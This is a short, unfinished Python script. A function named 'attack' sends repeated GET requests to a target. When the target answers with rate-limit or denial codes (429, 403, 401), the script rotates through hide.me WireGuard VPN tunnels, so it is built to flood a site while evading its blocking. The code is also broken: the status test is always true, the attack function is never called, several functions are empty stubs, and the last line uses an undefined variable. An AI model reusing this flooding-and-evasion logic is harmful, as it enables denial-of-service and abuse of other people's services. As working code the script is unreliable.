import subprocess
import random
import time
import os
import requests
import asyncio
import aiohttp

WIREGUARD_EXE = r"C:\Program Files\WireGuard\wireguard.exe"

tunnels = [
    r"C:\Users\User\Downloads\hide.me.albania.conf",
    r"C:\Users\User\Downloads\hide.me.brussel.conf",
    r"C:\Users\User\Downloads\hide.me.ukraine.conf",
    r"C:\Users\User\Downloads\hide.me.sydney.conf",
    r"C:\Users\User\Downloads\hide.me.marseil.conf",
]

def activate_tunnel(tunnel_path):
    tunnel_name = os.path.splitext(os.path.basename(tunnel_path))[0]

    subprocess.run([WIREGUARD_EXE, "/uninstalltunnelservice", tunnel_name])

    subprocess.run([WIREGUARD_EXE, "/installtunnelservice", tunnel_path])
    print(f"Connected to tunnel: {tunnel_name}")

async def attack(target):
    for _ in range(1, 1000):
        response = requests.get(target)
    if response.status_code == 429 or 403 or 401:
        if __name__ == "__main__":
            while True:
                selected = random.choice(tunnels)
                activate_tunnel(selected)
                time.sleep(3)

async def fetch(s, urls):
    pass

async def fetch_all():
    pass
            
async def main(s, urls):
    pass

if __name__ == '__main__':
    start = time.perf_counter()
    asyncio.run(fetch_all())
    end = time.perf_counter()
    print(f"The operation on tunnel {tunnel_name} took {end - start} seconds.")
